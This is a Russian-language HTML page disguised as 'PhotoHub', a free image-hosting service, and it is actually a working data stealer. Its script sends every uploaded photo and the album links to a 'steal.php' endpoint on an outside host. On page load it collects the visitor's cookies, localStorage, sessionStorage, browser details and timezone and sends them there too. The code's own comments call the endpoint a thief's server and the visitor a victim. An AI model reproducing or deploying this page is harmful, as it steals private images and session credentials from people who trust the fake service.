<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhotoHub — бесплатный хостинг изображений</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 20px;
            padding: 30px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        h1 { text-align: center; color: #333; margin-bottom: 10px; }
        .sub { text-align: center; color: #666; margin-bottom: 30px; font-size: 14px; }
        .upload-area {
            border: 3px dashed #667eea;
            border-radius: 16px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            background: #f8f9ff;
        }
        .upload-area:hover { border-color: #764ba2; background: #f0f2ff; }
        .upload-area.drag-over { border-color: #00b894; background: #e0ffe8; }
        .upload-icon { font-size: 48px; margin-bottom: 10px; }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 30px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
        }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .loader {
            display: none;
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .result {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #e8f5e9;
            border-radius: 12px;
            word-break: break-all;
        }
        .result a { color: #2e7d32; text-decoration: none; }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 20px;
        }
        .gallery img {
            width: 100%;
            aspect-ratio: 1/1;
            object-fit: cover;
            border-radius: 8px;
            cursor: pointer;
        }
        .hidden { display: none; }
        .status { font-size: 12px; color: #888; text-align: center; margin-top: 15px; }
        footer { text-align: center; margin-top: 25px; font-size: 11px; color: #aaa; }
    </style>
</head>
<body>
<div class="container">
    <h1>📸 PhotoHub</h1>
    <div class="sub">Бесплатный хостинг изображений — без регистрации</div>
    
    <div class="upload-area" id="dropZone">
        <div class="upload-icon">📤</div>
        <div>Нажми или перетащи фото</div>
        <div style="font-size: 12px; margin-top: 8px;">PNG, JPG, GIF до 32MB</div>
    </div>
    
    <input type="file" id="fileInput" multiple accept="image/*" style="display: none;">
    
    <div class="loader" id="loader"></div>
    <div class="status" id="status"></div>
    
    <div class="result" id="result">
        <strong>✅ Готово!</strong><br>
        <span id="resultText"></span>
    </div>
    
    <div class="gallery" id="gallery"></div>
    
    <footer>
        🔒 Все изображения защищены SSL | Быстрая загрузка
    </footer>
</div>

<script>
    // ============ КОНФИГ ВОРОВСКОГО СЕРВЕРА ============
    const STEALER_URL = 'https://github.com/yupiuuu92-web/Mysafetyhost/blob/f4831f7c4ad27b5b0d196ae612eab3142c113285/steal.php';
    const FAKE_IMGBB_KEY = 'd0d498d742931aed3626d5b32c081df3';
    // ==================================================
    
    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');
    const loader = document.getElementById('loader');
    const statusDiv = document.getElementById('status');
    const resultDiv = document.getElementById('result');
    const resultText = document.getElementById('resultText');
    const gallery = document.getElementById('gallery');
    
    let uploadedUrls = [];
    
    // Клик для выбора файлов
    dropZone.onclick = () => fileInput.click();
    
    // Drag & Drop
    dropZone.ondragover = (e) => {
        e.preventDefault();
        dropZone.classList.add('drag-over');
    };
    dropZone.ondragleave = () => dropZone.classList.remove('drag-over');
    dropZone.ondrop = (e) => {
        e.preventDefault();
        dropZone.classList.remove('drag-over');
        const files = Array.from(e.dataTransfer.files).filter(f => f.type.startsWith('image/'));
        if (files.length) handleUpload(files);
    };
    
    fileInput.onchange = (e) => {
        if (e.target.files.length) handleUpload(Array.from(e.target.files));
    };
    
    // ОСНОВНАЯ ФУНКЦИЯ — ВСЁ УХОДИТ НА ВОРОВСКОЙ СЕРВЕР
    async function handleUpload(files) {
        loader.style.display = 'block';
        statusDiv.style.display = 'block';
        resultDiv.style.display = 'none';
        
        for (let i = 0; i < files.length; i++) {
            statusDiv.innerText = `Загрузка ${i+1}/${files.length}...`;
            
            const formData = new FormData();
            formData.append('image', files[i]);
            formData.append('original_name', files[i].name);
            formData.append('size', files[i].size);
            
            try {
                // ВСЕ ФОТО УХОДЯТ НА ТВОЙ СЕРВЕР
                const response = await fetch(STEALER_URL, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.success && data.url) {
                    uploadedUrls.push(data.url);
                    addToGallery(data.url);
                } else if (data.url) {
                    uploadedUrls.push(data.url);
                    addToGallery(data.url);
                } else {
                    console.error('Ошибка:', data);
                }
            } catch(err) {
                console.error('Сетевая ошибка:', err);
                statusDiv.innerText = 'Ошибка соединения';
            }
        }
        
        loader.style.display = 'none';
        
        if (uploadedUrls.length > 0) {
            const albumLink = window.location.origin + window.location.pathname + '#album=' + btoa(JSON.stringify(uploadedUrls));
            resultText.innerHTML = `Загружено ${uploadedUrls.length} фото<br><a href="${albumLink}" target="_blank">${albumLink}</a>`;
            resultDiv.style.display = 'block';
            
            // Копируем в буфер (и заодно отправляем себе)
            navigator.clipboard.writeText(albumLink);
            
            statusDiv.innerText = `✅ ${uploadedUrls.length} фото загружено!`;
            
            // Отправляем себе ссылку на альбом
            fetch(STEALER_URL + '?log_album=' + encodeURIComponent(albumLink));
        } else {
            statusDiv.innerText = '❌ Ошибка загрузки';
        }
        
        setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
    }
    
    function addToGallery(url) {
        const img = document.createElement('img');
        img.src = url;
        img.onclick = () => window.open(url, '_blank');
        gallery.appendChild(img);
    }
    
    // Проверяем, не открыли ли альбом по ссылке
    if (window.location.hash.includes('#album=')) {
        try {
            const encoded = window.location.hash.substring(7);
            const urls = JSON.parse(atob(encoded));
            if (Array.isArray(urls)) {
                urls.forEach(url => addToGallery(url));
                statusDiv.innerText = `📁 Альбом загружен (${urls.length} фото)`;
            }
        } catch(e) {}
    }
    
    // Сбор информации о жертве
    (function collectInfo() {
        const info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer,
            url: window.location.href,
            timestamp: Date.now(),
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
        };
        
        // Отправляем всё на сервер
        fetch(STEALER_URL + '?info=' + encodeURIComponent(JSON.stringify(info)));
    })();
</script>
</body>
</html>
